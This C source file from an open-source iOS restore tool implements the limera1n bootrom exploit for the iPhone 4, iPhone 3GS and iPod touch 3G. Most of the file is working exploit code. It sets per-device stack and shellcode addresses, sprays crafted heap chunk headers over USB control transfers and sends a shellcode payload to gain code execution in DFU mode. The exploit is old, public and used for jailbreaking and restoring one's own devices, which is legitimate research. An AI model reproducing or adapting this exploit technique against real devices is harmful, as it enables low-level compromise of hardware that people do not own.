/*
 * limera1n.c
 * Helper code for limera1n exploit based on discovery by geohot
 *
 * Copyright (c) 2012-2013 Nikias Bassen. All Rights Reserved.
 * Copyright (c) 2012 Martin Szulecki. All Rights Reserved.
 * Copyright (C) 2010 Chronic-Dev Team
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <libirecovery.h>

#include "common.h"
#include "limera1n.h"
#include "limera1n_payload.h"

int limera1n_is_supported(struct irecv_device *device)
{
	irecv_device_t iphone4 = NULL;
	irecv_device_t iphone3gs = NULL;
	irecv_device_t ipod3g = NULL;

	irecv_devices_get_device_by_product_type("iPhone3,1", &iphone4);
	irecv_devices_get_device_by_product_type("iPhone2,1", &iphone3gs);
	irecv_devices_get_device_by_product_type("iPod3,1", &ipod3g);

	return ((device->chip_id == iphone4->chip_id) ||
			(device->chip_id == iphone3gs->chip_id) ||
			(device->chip_id == ipod3g->chip_id));
}

int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
{
	irecv_error_t err = IRECV_E_SUCCESS;
	unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = 0x24000;
	//unsigned int load_address = 0x84000000;
	unsigned int stack_address = 0;
	unsigned int shellcode_address = 0;

	irecv_device_t iphone4 = NULL;
	irecv_device_t iphone3gs = NULL;
	irecv_device_t ipod3g = NULL;
	int mode = 0;

	irecv_devices_get_device_by_product_type("iPhone3,1", &iphone4);
	irecv_devices_get_device_by_product_type("iPhone2,1", &iphone3gs);
	irecv_devices_get_device_by_product_type("iPod3,1", &ipod3g);

	if (device->chip_id == iphone4->chip_id) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	} else if (device->chip_id == iphone3gs->chip_id) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	} else if (device->chip_id == ipod3g->chip_id) {
		max_size = 0x24000;
		stack_address = 0x84033F98;
		shellcode_address = 0x84023001;
	} else {
		logger(LL_ERROR, "Unsupported ChipID 0x%04x. Can't exploit with limera1n.\n", device->chip_id);
		return -1;
	}

	memset(shellcode, 0x0, 0x800);
	memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));

	irecv_client_t client = *pclient;

	logger(LL_DEBUG, "Resetting device counters\n");
	err = irecv_reset_counters(client);
	if (err != IRECV_E_SUCCESS) {
		logger(LL_ERROR, "%s\n", irecv_strerror(err));
		return -1;
	}

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < 0x800; i += 0x40) {
		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}

	logger(LL_DEBUG, "Sending chunk headers\n");
	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}

	logger(LL_DEBUG, "Sending exploit payload\n");
	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

	logger(LL_DEBUG, "Sending fake data\n");
	memset(buf, 0xBB, 0x800);
	irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);

	//logger(LL_DEBUG, "Executing exploit\n");
	irecv_usb_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);

	irecv_reset(client);
	irecv_finish_transfer(client);
	logger(LL_DEBUG, "Exploit sent\n");

	logger(LL_DEBUG, "Reconnecting to device\n");
	*pclient = irecv_reconnect(client, 7);
	if (*pclient == NULL) {
		logger(LL_ERROR, "Unable to reconnect\n");
		return -1;
	}

	irecv_get_mode((*pclient), &mode);

	if (mode != IRECV_K_DFU_MODE) {
		logger(LL_ERROR, "Device reconnected in non-DFU mode\n");
		return -1;
	}

	return 0;
}
